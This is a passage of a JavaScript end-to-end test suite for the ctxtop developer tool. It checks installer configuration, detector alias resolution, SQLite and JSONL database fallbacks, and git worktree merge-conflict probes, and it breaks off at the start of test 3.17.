/**
 * @file test/e2e_tier3_pairwise.test.mjs
 * Highbeam v4.0 (`ctxtop`) — Tier 3 Cross-Feature Pairwise Test Suite
 *
 * Verifies all 41 cross-feature pairwise interactions (3.1 through 3.41)
 * mapped in TEST_INFRA.md § 4.3 and the three Spec Miner handoff reports:
 *   - Tests 3.1 to 3.14 (Features 1 - 14)
 *   - Tests 3.15 to 3.28 (Features 15 - 28)
 *   - Tests 3.29 to 3.41 (Features 29 - 41)
 *
 * Built strictly on node:test, node:assert/strict, and authentic production modules.
 * Zero facades, zero dummy implementations, zero external dependencies.
 */

import test, { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import net from 'node:net';
import crypto from 'node:crypto';
import { execFileSync, spawnSync } from 'node:child_process';

// Register Tier-2 Node I/O provider for atomic writes and clean sandbox handling
import '../src/utils/nodeIo.mjs';

// Sub-Harnesses & Shared Helpers from e2e_harness.mjs
import {
  detectRuntimeEnv,
  isSqliteAvailable,
  resetSqliteProbeCache,
  createTempWorkspace,
  createIsolatedTestSandbox,
  createMockToolSpan,
  createMockUSTFTrajectory,
  validateUSTFv1,
  serializeUSTFv1,
  deserializeUSTFv1,
  createMockDatabaseFixture,
  getMockDatabaseClient,
  checkModLaws,
  checkZeroRuntimeDeps,
  assertNoNodeBuiltinImports,
  getPlatformPipePath,
  startMockIpcServer,
  sendIpcMessage,
  stopIpcServer,
  simulateCliFallback,
  writeControlLatch,
  readControlLatch,
  calculateBreakEvenCStar,
  verifyRetentionRadarDiff,
  checkHaiku100kCliffBreaker,
  calculateDualTtlCountdown,
  partitionBillingBlocks,
  assertPlainTextCompact,
  assertActiveSourceProtected,
  assertMirrorParity,
  assertNoOutboundEgress,
  withNetworkSpy
} from './helpers/e2e_harness.mjs';

// Production modules under test
import {
  runCli,
  executeInitSubcommand,
  installAttentionHorizon,
  CANONICAL_AH_HOOKS
} from '../bin/ctxtop.mjs';
import { executeStatusLineBridge } from '../bin/ah-statusline.mjs';
import {
  DETECTOR_CATALOG,
  resolveDetectorId,
  resolveCanonicalDetectorId,
  getDetectorMeta,
  detectors
} from '../src/core-isomorphic/catalog/detectorCatalog.mjs';
import {
  loadHorizonConfig,
  resolveDetectorOverride,
  applyDetectorOverride
} from '../src/core-isomorphic/config/horizonConfig.mjs';
import {
  validateUstfTrajectory,
  validateUstfSpan,
  validateUstfUsage
} from '../src/core-isomorphic/ustf/schema.mjs';
import {
  createSpan,
  endSpan,
  buildCallTree,
  computeCriticalPath,
  closeUnclosedSpans
} from '../src/core-isomorphic/control/callTree.mjs';
import {
  evaluateSemanticDrift,
  auditHypothesisLoop,
  auditInvariantContradiction
} from '../src/core-isomorphic/diagnostics/drift_guard.mjs';
import {
  sanitizePostToolOutput,
  isToolEligibleForSanitization,
  OFFLOAD_TOKEN_THRESHOLD
} from '../src/core-isomorphic/guards/losslessPostSanitizer.mjs';
import {
  createInitialThinkingDrift,
  applyThinkingDriftEvent,
  evaluateThinkingDriftLoop,
  classifyTurnDrift,
  formatTtft,
  createInitialPrefixRetention,
  applyPrefixRetentionRequest,
  formatRetentionCompact
} from '../src/core-isomorphic/telemetry/sprintMetrics.mjs';
import { fnv1a64Hex } from '../src/core/shared/fnv1a64.mjs';
import {
  computeBreakEvenCachedTokens,
  resolveNaturalDownshiftPeer,
  isPrefixInstructionFile
} from '../src/core-isomorphic/coach/cacheGravityRouter.mjs';
import {
  evaluateDet12HaikuPreCliffBreaker
} from '../src/core-isomorphic/guards/circuitBreakers.mjs';
import {
  buildTurnVelocitySparkline,
  scorePromptSufficiency,
  RUBRIC_DIMENSIONS,
  SUFFICIENCY_BANDS
} from '../src/core/prompt_rubric.mjs';
import {
  renderRetentionStepChart,
  renderCostRadarHtml,
  renderTopologyGraph
} from '../src/core/timeline_svg.mjs';
import {
  renderStatusLine,
  renderAbovePromptBand,
  renderSimpleViewPane,
  renderAdvancedViewPane
} from '../src/core-isomorphic/ui/modViews.mjs';
import { computeHorizonGrid } from '../src/core-isomorphic/ui/horizonGrid.mjs';
import {
  getDatabaseClient,
  isNodeSqliteAvailable,
  JsonlDatabaseFallbackWrapper
} from '../src/engine-node/db/index.mjs';
import { SqliteDatabaseSyncWrapper } from '../src/engine-node/db/sqlite_wrapper.mjs';
import {
  detectDirtySnapshots,
  detectUnseenCallers
} from '../src/engine-node/sensors/blindspots.mjs';
import {
  probeGitMergeTree
} from '../src/engine-node/sensors/git_merge_tree.mjs';
import {
  inspectGitWorktrees
} from '../src/core/swarm_topology.mjs';
import {
  computeSwarmSummary
} from '../src/core-isomorphic/telemetry/swarmTopology.mjs';
import {
  CONTROL_STATES,
  createInitialControlState,
  transitionControlState,
  evaluateToolBoundaryLatch,
  parseControlFile
} from '../src/core-isomorphic/control/controlStateMachine.mjs';
import {
  evaluateCoachLatch,
  renderCoachPill
} from '../src/core-isomorphic/control/coachLatches.mjs';
import { MicroIpcServer } from '../src/engine-node/ipc/server.mjs';
import { MicroIpcClient } from '../src/engine-node/ipc/client.mjs';
import { runPreToolUseHook } from '../hooks/handlers/pre-tool-use.mjs';
import { runPostToolUseHook } from '../hooks/handlers/post-tool-use.mjs';
import { isIgnorablePath } from '../src/core/paths.mjs';
import { sanitizeForensicPayload } from '../src/core/sanitizer.mjs';
import {
  HORIZON_CSRF_TOKEN,
  isValidCsrfToken
} from '../sidecars/horizon-daemon/server.mjs';

// ============================================================================
// Group 1: Features 1 through 14 Pairwise Interactions (Tests 3.1 - 3.14)
// ============================================================================
describe('Tier 3: Pairwise Interactions (Features 1 - 14)', () => {

  // Test 3.1: Feature 1 ↔ Feature 7
  it('3.1 Pairwise: Single ctxtop Package executes with Zero Runtime Dependencies', () => {
    const pkgPath = path.resolve('package.json');
    const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
    assert.equal(pkg.name, 'ctxtop');
    assert.equal(pkg.version, '4.0.0');
    assert.equal(pkg.type, 'module');

    const depCheck = checkZeroRuntimeDeps(pkgPath);
    assert.equal(depCheck.valid, true, 'Zero runtime dependencies must be maintained');
    assert.equal(depCheck.dependencies.length, 0);

    const ws = createTempWorkspace({ prefix: 'ctxtop-airgap-p1-' });
    try {
      const cliPath = path.resolve(pkg.bin.ctxtop);
      const result = spawnSync(process.execPath, [cliPath, '--version'], {
        cwd: ws.wsDir,
        env: { ...process.env, NODE_PATH: '' },
        encoding: 'utf8'
      });
      assert.equal(result.status, 0, `CLI failed with stderr: ${result.stderr}`);
      assert.ok(result.stdout.includes('4.0.0'), 'CLI must output package version');
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.2: Feature 2 ↔ Feature 3
  it('3.2 Pairwise: Dual Plugin Manifests configured simultaneously via Zero-Config Installer', () => {
    const sandbox = createIsolatedTestSandbox({ withAntigravityDir: true, withClaudeDir: true });
    try {
      const initRes = executeInitSubcommand(['--all', '--workspace'], {
        cwd: sandbox.workspaceDir,
        homeDir: sandbox.homeDir
      });
      assert.equal(initRes.ok, true, 'Init must succeed for dual hosts');
      assert.equal(initRes.exitCode, 0);

      // Verify Claude Code configuration hermetically isolated to sandbox
      const claudeSettingsPath = path.join(sandbox.workspaceDir, '.claude', 'settings.json');
      assert.ok(fs.existsSync(claudeSettingsPath), 'Claude settings.json must be created in sandbox');
      const claudeSettings = JSON.parse(fs.readFileSync(claudeSettingsPath, 'utf8'));
      assert.ok(claudeSettings.hooks, 'Hooks must be configured in Claude settings.json');

      // Verify Antigravity configuration hermetically isolated to sandbox
      const agPluginDir = path.join(sandbox.workspaceDir, '.agents', 'plugins', 'agy-horizon-flightcheck');
      const agManifestPath = path.join(agPluginDir, 'plugin.json');
      assert.ok(fs.existsSync(agManifestPath), 'Antigravity plugin.json must be deployed into sandbox workspace');
      const agManifest = JSON.parse(fs.readFileSync(agManifestPath, 'utf8'));
      assert.equal(agManifest.version, '4.0.0');
      assert.equal(agManifest.hooks, './hooks.json');

      // Verify Antigravity hooks generated inside sandbox
      const agHooksPath = path.join(agPluginDir, 'hooks.json');
      assert.ok(fs.existsSync(agHooksPath), 'Antigravity hooks.json must be generated in sandbox workspace');

      // Verify Antigravity statusLine configured in sandbox home
      const agSettingsPath = path.join(sandbox.homeDir, '.gemini', 'antigravity', 'settings.json');
      assert.ok(fs.existsSync(agSettingsPath), 'Antigravity settings.json must be written into sandbox homeDir');
      const agSettings = JSON.parse(fs.readFileSync(agSettingsPath, 'utf8'));
      assert.ok(agSettings.statusLine, 'StatusLine must be configured in Antigravity settings');

      // Verify Dual Manifest package parity
      const ccManifest = JSON.parse(fs.readFileSync(path.resolve('.claude-plugin', 'plugin.json'), 'utf8'));
      assert.equal(ccManifest.version, '4.0.0');
      assert.equal(ccManifest.hooks, './hooks/hooks.json');
    } finally {
      sandbox.cleanup();
    }
  });

  // Test 3.3: Feature 3 ↔ Feature 12
  it('3.3 Pairwise: Zero-Config Installer preserves legacy DET-21 alias config during migration', () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-legacy-p3-' });
    try {
      const legacyConfigPath = path.join(ws.wsDir, '.attention-horizon.json');
      const legacyConfig = {
        detectors: {
          'DET-21': 'off',
          'DET-01': 'guard'
        }
      };
      fs.writeFileSync(legacyConfigPath, JSON.stringify(legacyConfig, null, 2), 'utf8');

      // Setup pre-existing .claude/settings.json to verify backup preservation
      const claudeDir = path.join(ws.wsDir, '.claude');
      fs.mkdirSync(claudeDir, { recursive: true });
      const settingsPath = path.join(claudeDir, 'settings.json');
      fs.writeFileSync(settingsPath, JSON.stringify({ existingUserPref: true, detectors: { 'DET-21': 'off' } }));

      const ts = 1712000000000;
      const installRes = installAttentionHorizon({
        cwd: ws.wsDir,
        homeDir: ws.homeDir,
        scope: 'project',
        timestamp: ts
      });
      assert.equal(installRes.ok, true);

      assert.ok(installRes.backupPath && fs.existsSync(installRes.backupPath));
      const backupContent = JSON.parse(fs.readFileSync(installRes.backupPath, 'utf8'));
      assert.equal(backupContent.detectors['DET-21'], 'off');

      const loaded = loadHorizonConfig({ cwd: ws.wsDir });
      assert.equal(resolveDetectorOverride('DET-30', loaded), 'off');
      assert.equal(resolveDetectorOverride('DET-21', loaded), 'off');
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.4: Feature 4 ↔ Feature 5
  it('3.4 Pairwise: Isomorphic Mod Core modules statically comply with Claude Mod Laws 1-5', () => {
    const coreDir = path.resolve('src', 'core-isomorphic');
    const files = [];
    function scan(dir) {
      for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, ent.name);
        if (ent.isDirectory()) scan(full);
        else if (ent.name.endsWith('.mjs') || ent.name.endsWith('.js')) files.push(full);
      }
    }
    scan(coreDir);
    assert.ok(files.length >= 10, 'Must scan multiple isomorphic modules');

    // Mod Law 1 (Zero node:* imports) applies strictly to 100% of isomorphic files
    for (const file of files) {
      const code = fs.readFileSync(file, 'utf8');
      assertNoNodeBuiltinImports(code);
    }

    // Pure Mod business logic modules adhere strictly to full Mod Laws 1-5
    const pureModModules = files.filter(f =>
      !f.includes('runtime.mjs') &&
      !f.includes('circuitBreakers.mjs') &&
      !f.includes('det01_03_shell_secret.mjs') &&
      !f.includes('det13_20_mcp_scope.mjs') &&
      !f.includes('stateBatonHydrator.mjs') &&
      !f.includes('losslessPostSanitizer.mjs')
    );
    assert.ok(pureModModules.length >= 30, 'Pure Mod core modules count must be >= 30');

    for (const file of pureModModules) {
      const code = fs.readFileSync(file, 'utf8');
      const result = checkModLaws(code);
      assert.equal(result.valid, true, `Mod Law violations in ${path.relative(coreDir, file)}: ${result.violations.join(', ')}`);
    }
  });

  // Test 3.5: Feature 5 ↔ Feature 4
  it('3.5 Pairwise: Claude Mod Law runtime engine fails closed on invalid inputs in isolate sandbox', () => {
    const tokenBreakEven = computeBreakEvenCachedTokens({
      currentModel: 'claude-opus-5-5',
      targetModel: 'claude-sonnet-5-5'
    });
    assert.equal(typeof tokenBreakEven, 'object');
    assert.equal(typeof tokenBreakEven.breakEvenTokens, 'number');
    assert.ok(tokenBreakEven.breakEvenTokens > 0);

    const corruptedTraj = validateUstfTrajectory(null);
    assert.equal(corruptedTraj.valid, false);
    assert.ok(corruptedTraj.errors.length > 0);

    const emptyDrift = evaluateThinkingDriftLoop(null);
    assert.equal(emptyDrift.triggered, false);

    const cleanSanitized = sanitizePostToolOutput(undefined, undefined);
    assert.equal(cleanSanitized.sanitized, false);
  });

  // Test 3.6: Feature 6 ↔ Feature 24
  it('3.6 Pairwise: USTF v1 Trajectory serializes and round-trips hierarchical Call-Tree spans', () => {
    const now = Date.now();
    const rootSpan = createSpan({ spanId: 'span-root', name: 'agent-turn', kind: 'agent', startTimeMs: now });
    const toolSpan1 = createSpan({ spanId: 'span-tool-1', parentSpanId: 'span-root', name: 'read_file', kind: 'tool', startTimeMs: now + 10 });
    endSpan(toolSpan1, { endTimeMs: now + 25, status: 'ok' });
    const toolSpan2 = createSpan({ spanId: 'span-tool-2', parentSpanId: 'span-root', name: 'edit_file', kind: 'tool', startTimeMs: now + 30 });
    const nestedChild = createSpan({ spanId: 'span-sub-1', parentSpanId: 'span-tool-2', name: 'linter', kind: 'tool', startTimeMs: now + 35 });
    endSpan(nestedChild, { endTimeMs: now + 45, status: 'ok' });
    endSpan(toolSpan2, { endTimeMs: now + 50, status: 'ok' });
    endSpan(rootSpan, { endTimeMs: now + 60, status: 'ok' });

    const spans = [rootSpan, toolSpan1, toolSpan2, nestedChild];
    for (const span of spans) {
      const spanValidation = validateUstfSpan(span);
      assert.equal(spanValidation.valid, true, `Span validation failed: ${spanValidation.errors.join(', ')}`);
    }

    const tree = buildCallTree(spans);
    assert.equal(tree.length, 1);
    assert.equal(tree[0].children.length, 2);
    assert.equal(tree[0].children[1].children.length, 1);

    const trajectory = createMockUSTFTrajectory({ turnsCount: 1 });
    trajectory.turns[0].spans = spans.map(s => ({
      spanId: s.spanId,
      parentSpanId: s.parentSpanId,
      name: s.name,
      kind: s.kind,
      startTimeMs: s.startTimeMs,
      endTimeMs: s.endTimeMs,
      durationMs: s.durationMs,
      status: s.status
    }));

    const validation = validateUSTFv1(trajectory);
    assert.equal(validation.valid, true, `Validation failed: ${validation.errors.join(', ')}`);

    const serialized = serializeUSTFv1(trajectory);
    const deserialized = deserializeUSTFv1(serialized);
    assert.deepEqual(deserialized.turns[0].spans, trajectory.turns[0].spans);
  });

  // Test 3.7: Feature 7 ↔ Feature 1
  it('3.7 Pairwise: Zero Runtime Dependencies gate verifies all files declared in ctxtop package manifest', () => {
    const pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'));
    assert.ok(!pkg.dependencies || Object.keys(pkg.dependencies).length === 0);

    for (const entry of pkg.files) {
      const entryPath = path.resolve(entry);
      assert.ok(fs.existsSync(entryPath), `Declared package file/dir '${entry}' must exist on disk`);
    }

    function scanNoNpmImports(dir) {
      for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, ent.name);
        if (ent.isDirectory()) {
          scanNoNpmImports(full);
        } else if (ent.name.endsWith('.mjs') || ent.name.endsWith('.js')) {
          const code = fs.readFileSync(full, 'utf8');
          const matches = code.matchAll(/\bimport\s+.*?from\s+['"]([^'"]+)['"]/g);
          for (const m of matches) {
            const spec = m[1];
            assert.ok(
              spec.startsWith('.') || spec.startsWith('/') || spec.startsWith('node:'),
              `Forbidden external npm dependency '${spec}' in ${full}`
            );
          }
        }
      }
    }
    scanNoNpmImports(path.resolve('bin'));
    scanNoNpmImports(path.resolve('src'));
  });

  // Test 3.8: Feature 8 ↔ Feature 9
  it('3.8 Pairwise: Dynamic SQLite Probing cleanly routes to JSONL Fallback with zero warning output', () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-db-probe-p8-' });
    try {
      const jsonlPath = path.join(ws.wsDir, 'transcript.jsonl');
      fs.writeFileSync(jsonlPath, [
        JSON.stringify({ step: 1, type: 'USER', content: 'hello' }),
        JSON.stringify({ step: 2, type: 'MODEL', content: 'world' })
      ].join('\n') + '\n');

      const client = getDatabaseClient({
        dbPath: jsonlPath,
        forceFallback: true,
        readOnly: true
      });
      assert.ok(client instanceof JsonlDatabaseFallbackWrapper);

      const record = client.get("SELECT * FROM steps WHERE step = 2");
      assert.ok(record);
      assert.equal(record.content, 'world');

      const allRecords = client.all("SELECT * FROM steps");
      assert.equal(allRecords.length, 2);
      client.close();
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.9: Feature 9 ↔ Feature 8
  it('3.9 Pairwise: Node 20 JSONL Fallback and Native SQLite produce equivalent query responses', async () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-query-parity-p9-' });
    try {
      const records = [
        { id: 1, status: 'OK', tokens: 150 },
        { id: 2, status: 'WARN', tokens: 450 },
        { id: 3, status: 'OK', tokens: 800 }
      ];
      const jsonlPath = ws.writeFile('steps.jsonl', records.map(r => JSON.stringify(r)).join('\n') + '\n');
      const targetBase = path.join(ws.wsDir, 'parity_fixture');
      const { dbPath } = await createMockDatabaseFixture(targetBase, {
        tables: { steps: 'id INT, status TEXT, tokens INT' },
        records: records.map(r => ({ __table: 'steps', __values: r }))
      });

      const fallbackClient = getDatabaseClient({ dbPath: jsonlPath, forceFallback: true, readOnly: true });
      const fallbackRows = fallbackClient.all("SELECT * FROM steps WHERE status = 'OK'");
      assert.equal(fallbackRows.length, 2);
      assert.equal(fallbackRows[0].id, 1);
      assert.equal(fallbackRows[1].id, 3);
      fallbackClient.close();

      if (isNodeSqliteAvailable()) {
        const sqliteClient = getDatabaseClient({ dbPath, readOnly: true, forceFallback: false });
        const sqliteRows = sqliteClient.all("SELECT * FROM steps WHERE status = 'OK'");
        assert.equal(sqliteRows.length, fallbackRows.length);
        assert.equal(sqliteRows[0].id, fallbackRows[0].id);
        assert.equal(sqliteRows[1].id, fallbackRows[1].id);
        sqliteClient.close();
      }
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.10: Feature 10 ↔ Feature 39
  it('3.10 Pairwise: Read-Only SQLite Invariant enforces zero writes with zero outbound socket connections', async () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-sec-p10-' });
    try {
      const jsonlPath = path.join(ws.wsDir, 'audit.jsonl');
      fs.writeFileSync(jsonlPath, '{"id": 1, "action": "LOGIN"}\n');

      const { violations } = await withNetworkSpy(async () => {
        const client = getDatabaseClient({ dbPath: jsonlPath, forceFallback: true, readOnly: true });

        const item = client.get("SELECT * FROM audit WHERE id = 1");
        assert.equal(item.action, 'LOGIN');

        assert.throws(() => {
          client.get("INSERT INTO audit VALUES (2, 'HACK')");
        }, /Zero-Trust SQLite Guard/);

        assert.throws(() => {
          getDatabaseClient({ dbPath: jsonlPath, readOnly: false });
        }, /Zero-Trust SQLite Guard/);

        client.close();
      });

      assert.equal(violations.length, 0, 'No outbound connections permitted');
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.11: Feature 11 ↔ Feature 12
  it('3.11 Pairwise: Unified DET Catalog resolves DET-21 alias directly to canonical DET-30 metadata', () => {
    const det30Meta = getDetectorMeta('DET-30');
    assert.ok(det30Meta);
    assert.equal(det30Meta.id, 'DET-30');
    assert.equal(det30Meta.primarySlug, 'thinking-drift-loop');
    assert.equal(det30Meta.defaultMode, 'guard');

    const det21Meta = getDetectorMeta('DET-21');
    assert.ok(det21Meta);
    assert.equal(det21Meta.id, 'DET-30');
    assert.equal(det21Meta.primarySlug, 'thinking-drift-loop');

    assert.equal(resolveDetectorId('det-21'), 'DET-30');
    assert.equal(resolveDetectorId('DET21'), 'DET-30');
    assert.equal(resolveCanonicalDetectorId('DET-21'), 'DET-30');

    assert.equal(DETECTOR_CATALOG['DET-21'].aliasOf, 'DET-30');
    assert.equal(detectors.has('DET-21'), true);
    assert.equal(detectors.has('DET-30'), true);
  });

  // Test 3.12: Feature 12 ↔ Feature 11
  it('3.12 Pairwise: Configuration with DET-21 alias overrides canonical DET-30 in detector engine', () => {
    const cfg1 = loadHorizonConfig({
      overrides: { detectors: { 'DET-21': 'off' } }
    });
    assert.equal(resolveDetectorOverride('DET-30', cfg1), 'off');
    assert.equal(resolveDetectorOverride('DET-21', cfg1), 'off');

    const cfg2 = loadHorizonConfig({
      overrides: {
        detectors: {
          'DET-21': 'off',
          'DET-30': 'block'
        }
      }
    });
    assert.equal(resolveDetectorOverride('DET-30', cfg2), 'block');

    const overridden = applyDetectorOverride({
      detectorId: 'DET-30',
      triggered: true,
      decision: 'block'
    }, cfg1);
    assert.equal(overridden.decision, 'allow');
    assert.equal(overridden.overriddenByConfig, 'off');
  });

  // Test 3.13: Feature 13 ↔ Feature 14
  it('3.13 Pairwise: Local Repo Blindspot Sensors and DET-31 probe execute non-destructively in Git repository', () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-git-p13-' });
    try {
      execFileSync('git', ['init'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['config', 'user.name', 'Test'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['config', 'user.email', 'test@example.com'], { cwd: ws.wsDir, stdio: 'ignore' });

      ws.writeFile('app.js', 'console.log("v0");\n');
      execFileSync('git', ['add', '.'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['commit', '-m', 'c0'], { cwd: ws.wsDir, stdio: 'ignore' });
      const defaultBranch = execFileSync('git', ['branch', '--show-current'], { cwd: ws.wsDir, encoding: 'utf8' }).trim() || 'master';

      execFileSync('git', ['checkout', '-b', 'feat-1'], { cwd: ws.wsDir, stdio: 'ignore' });
      ws.writeFile('app.js', 'console.log("feat-1");\n');
      execFileSync('git', ['commit', '-am', 'c1'], { cwd: ws.wsDir, stdio: 'ignore' });

      execFileSync('git', ['checkout', defaultBranch], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['checkout', '-b', 'feat-2'], { cwd: ws.wsDir, stdio: 'ignore' });
      ws.writeFile('app.js', 'console.log("feat-2");\n');
      execFileSync('git', ['commit', '-am', 'c2'], { cwd: ws.wsDir, stdio: 'ignore' });

      const touchedFile = path.join(ws.wsDir, 'app.js');
      const pastTime = Date.now() - 5000;
      fs.utimesSync(touchedFile, new Date(), new Date());
      const stepEvents = [{ toolName: 'read_file', targetPath: touchedFile, timestampMs: pastTime }];

      const dirtyFiles = detectDirtySnapshots(stepEvents, ws.wsDir);
      assert.ok(dirtyFiles.length >= 1);

      const probeRes = probeGitMergeTree('feat-1', 'feat-2', { workspaceDir: ws.wsDir });
      assert.equal(probeRes.hasConflict, true);
      assert.ok(probeRes.conflictFiles.some(f => f.includes('app.js')));
      assert.ok(probeRes.latencyMs >= 0);

      const statusOut = execFileSync('git', ['status', '--porcelain'], { cwd: ws.wsDir, encoding: 'utf8' });
      assert.equal(statusOut.trim(), '', 'Repository must remain clean after merge-tree probe');
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.14: Feature 14 ↔ Feature 25
  it('3.14 Pairwise: DET-31 probe discovers merge conflicts across Swarm subagent worktrees', () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-swarm-wt-p14-' });
    const wt1Dir = path.join(ws.wsDir, 'wt-agent-1');
    const wt2Dir = path.join(ws.wsDir, 'wt-agent-2');

    try {
      execFileSync('git', ['init'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['config', 'user.name', 'Test'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['config', 'user.email', 'test@example.com'], { cwd: ws.wsDir, stdio: 'ignore' });
      // Prevent background git gc/maintenance processes on Windows from locking files
      execFileSync('git', ['config', 'gc.auto', '0'], { cwd: ws.wsDir, stdio: 'ignore' });

      ws.writeFile('index.js', 'module.exports = {};\n');
      execFileSync('git', ['add', '.'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['commit', '-m', 'root commit'], { cwd: ws.wsDir, stdio: 'ignore' });

      execFileSync('git', ['worktree', 'add', '-b', 'swarm-agent-1', wt1Dir], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['worktree', 'add', '-b', 'swarm-agent-2', wt2Dir], { cwd: ws.wsDir, stdio: 'ignore' });

      fs.writeFileSync(path.join(wt1Dir, 'index.js'), 'module.exports = { agent: 1 };\n', 'utf8');
      execFileSync('git', ['commit', '-am', 'agent 1 change'], { cwd: wt1Dir, stdio: 'ignore' });

      fs.writeFileSync(path.join(wt2Dir, 'index.js'), 'module.exports = { agent: 2 };\n', 'utf8');
      execFileSync('git', ['commit', '-am', 'agent 2 change'], { cwd: wt2Dir, stdio: 'ignore' });

      const wtInspection = inspectGitWorktrees(ws.wsDir);
      assert.equal(wtInspection.available, true);
      assert.ok(wtInspection.worktrees.length >= 3);

      const mergeCheck = probeGitMergeTree('swarm-agent-1', 'swarm-agent-2', { workspaceDir: ws.wsDir });
      assert.equal(mergeCheck.hasConflict, true);
      assert.ok(mergeCheck.conflictFiles.some(f => f.includes('index.js')));

      const summary = computeSwarmSummary({
        subagents: {
          'sub-1': { agentId: 'sub-1', branch: 'swarm-agent-1', worktree: wt1Dir },
          'sub-2': { agentId: 'sub-2', branch: 'swarm-agent-2', worktree: wt2Dir }
        }
      });
      assert.equal(summary.workers.length, 2);
    } finally {
      // Step 1: Remove each subagent worktree individually with retry
      for (const wt of [wt1Dir, wt2Dir]) {
        for (let attempt = 0; attempt < 3; attempt++) {
          try {
            if (fs.existsSync(wt)) {
              execFileSync('git', ['worktree', 'remove', '--force', wt], { cwd: ws.wsDir, stdio: 'ignore' });
            }
            break;
          } catch {
            const start = Date.now();
            while (Date.now() - start < 50) {}
          }
        }
      }

      // Step 2: Prune worktree metadata to release stale references
      try {
        execFileSync('git', ['worktree', 'prune', '--expire', 'now'], { cwd: ws.wsDir, stdio: 'ignore' });
      } catch (_err) { void _err; }

      // Step 3: Explicit safe unlink fallback for any lingering worktree folders before workspace teardown
      for (const wt of [wt1Dir, wt2Dir]) {
        if (fs.existsSync(wt)) {
          for (let attempt = 0; attempt < 5; attempt++) {
            try {
              fs.rmSync(wt, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 });
              break;
            } catch {
              const start = Date.now();
              while (Date.now() - start < 50) {}
            }
          }
        }
      }

      // Step 4: Final workspace cleanup
      ws.cleanup();
    }
  });

});

// ============================================================================
// Group 2: Features 15 through 28 Pairwise Interactions (Tests 3.15 - 3.28)
// ============================================================================
describe('Tier 3: Pairwise Interactions (Features 15 - 28)', () => {

  // Test 3.15: Feature 15 ↔ Feature 17
  it('3.15 Pairwise: DET-32 Semantic Drift Guard correlates with TTFT latency spikes and thinking drift ratio', () => {
    const recentTurns = [
      { turn: 1, hypothesis: 'Bug is caused by missing env var', outcome: 'failed' },
      { turn: 2, hypothesis: 'Bug is caused by missing env var', outcome: 'failed' },
      { turn: 3, hypothesis: 'Bug is caused by missing env var', outcome: 'failed' }
    ];
    const loopAudit = auditHypothesisLoop(recentTurns);
    assert.equal(loopAudit.isLoop, true);

    let drift = createInitialThinkingDrift();
    drift = applyThinkingDriftEvent(drift, {
      eventType: 'turn.complete',
      thinkingTokens: 6000,
      outputTokens: 150,
      turnStartedAtMs: 1000,
      nowMs: 9500
    });
    assert.equal(drift.lastTtftMs, 8500);
    assert.equal(drift.lastDriftRatio, 40.0);

    const loopRes = evaluateThinkingDriftLoop([
      { thinkingTokens: 5000, visibleOutputTokens: 200, mutatingCalls: 0 },
      { thinkingTokens: 6000, visibleOutputTokens: 150, mutatingCalls: 0 }
    ]);
    assert.equal(loopRes.triggered, true);
    assert.equal(loopRes.gaDetectorId, 'DET-30');

    // In COACH mode, semantic drift emits advisory warning with bounded re-anchoring directive
    const driftRes = evaluateSemanticDrift({ recentTurns, flightMode: 'COACH' });
    assert.equal(driftRes.triggered, true);
    assert.equal(driftRes.decision, 'warn');
    assert.ok(driftRes.reanchoringDirective.includes('[DET-32 Re-anchoring Directive]'));
    assert.ok(driftRes.reanchoringDirective.length <= 1200);

    // In AUTO_PILOT mode, escalates to blocking deny
    const blockingRes = evaluateSemanticDrift({ recentTurns, flightMode: 'AUTO_PILOT' });
    assert.equal(blockingRes.decision, 'deny');
  });

  // Test 3.16: Feature 16 ↔ Feature 18
  it('3.16 Pairwise: Lossless PostToolUse offloader preserves >=95% prefix-cache retention by preventing transcript bloat', () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-offload-p16-' });
    try {
      const systemPrompt = 'System Prompt: Highbeam v4.0 assistant with strict invariants.\n'.repeat(60);
      const largeOutput = 'PASS test/unit_1.test.mjs\n' + 'Log line chunk data details.\n'.repeat(900);

      const resOffload = sanitizePostToolOutput({
        toolName: 'Bash',
        toolOutput: largeOutput
      }, { cwd: ws.wsDir });

      assert.equal(resOffload.offloaded, true);
      assert.ok(resOffload.artifactPath);
      assert.ok(fs.existsSync(resOffload.artifactPath));

      // With offloader, subsequent turn prompt keeps stable prefix (Grade A >=95%)
      const promptTurn1 = systemPrompt + '\nUser: run build\nAssistant: Running build.\nTool: ' + resOffload.updatedToolOutput;
      const promptTurn2 = promptTurn1 + '\nUser: run next\nAssistant: ';
      const diffWithOffload = verifyRetentionRadarDiff(promptTurn1, promptTurn2);
      assert.ok(diffWithOffload.retentionPct >= 95);
      assert.equal(diffWithOffload.grade, 'A');
      assert.equal(diffWithOffload.is95PctRetained, true);

      // Invariant: Workspace read tool is strictly NEVER offloaded
      const readRes = sanitizePostToolOutput({ toolName: 'read_file', toolOutput: largeOutput }, { cwd: ws.wsDir });
      assert.equal(readRes.offloaded, false);
      assert.equal(readRes.eligible, false);
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.17: Feature 17 ↔ Feature 15
  it('3.17 Pairwise: Thinking drift telemetry distinguishes productive deep reasoning from repetitive semantic loops', () => {
